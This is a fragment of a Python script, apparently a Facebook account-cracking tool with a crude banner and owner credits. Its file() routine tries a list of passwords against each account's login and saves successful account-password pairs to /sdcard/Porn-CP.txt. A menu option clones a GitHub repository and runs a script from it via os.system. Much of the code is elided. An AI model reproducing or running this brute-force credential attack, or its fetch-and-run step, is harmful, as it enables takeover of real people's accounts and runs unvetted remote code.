...
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:      "Th'w Porn Star'w Here (y)"
...
\033[1;97m Owner.       : P0RN ST9R 

\033[1;97m Facebook     : Shwtanii'w Keera 

\033[1;97m Version.     : 0.0.1:
...
def file():
    ...
    if 'gm' in l:
        ...
        file = input(f"{oo('-')}Enter Porn File: ")
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                ...
                open('/sdcard/Porn-CP.txt','a').write(f'{acc} • {pword}\n')
...
def Hxw_Main():
    ...
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/abdullahmughal76/badkiirdar')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
